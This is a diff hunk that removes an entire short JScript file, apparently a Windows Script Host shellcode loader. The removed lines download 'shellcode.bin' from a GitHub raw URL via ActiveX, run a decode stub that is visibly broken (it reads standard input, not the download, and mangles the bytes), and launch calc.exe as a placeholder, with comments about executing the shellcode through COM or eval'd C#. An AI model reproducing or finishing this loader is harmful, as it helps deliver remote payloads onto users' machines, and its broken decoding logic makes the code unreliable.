@@ -1,8 +1,0 @@
-var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-xhr.open("GET", "https://github.com/MJansen6/bp/raw/refs/heads/main/shellcode.bin", false);
-xhr.send();
-var b64 = xhr.responseText;
-var sc = (new VBArray((new ActiveXObject("Scripting.FileSystemObject")).GetStandardStream(0).ReadAll().split('')).toArray()).map(function(c){return parseInt(c.charCodeAt(0).toString(16),16)}).join(''); // base64 decode stub - use better impl
-// Use COM to allocate/execute (or fetch C# code and eval)
-var shell = new ActiveXObject("WScript.Shell");
-shell.Run("calc.exe"); // placeholder - replace with full shellcode exec via COM or dynamic code
